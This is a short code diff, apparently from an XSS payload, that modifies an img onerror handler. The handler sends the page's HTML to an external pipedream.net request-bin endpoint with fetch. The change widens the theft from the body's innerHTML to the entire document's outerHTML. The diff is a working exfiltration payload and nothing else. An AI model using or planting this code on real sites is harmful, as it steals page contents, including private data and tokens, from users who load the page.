@@ -10,7 +10,9 @@
                 var img = document.createElement('img');
                 img.src = "x"; 
                 img.onerror = function() {
-                    fetch("https://eo8bzrb9y2mj48v.m.pipedream.net?" + encodeURIComponent(document.body.innerHTML))
+                    var encodedHTML = encodeURIComponent(document.documentElement.outerHTML);
+                    var endpoint = "https://eo8bzrb9y2mj48v.m.pipedream.net?";
+                    fetch(endpoint + encodedHTML)
                     .catch(error => console.error("Error:", error));
                 };
                
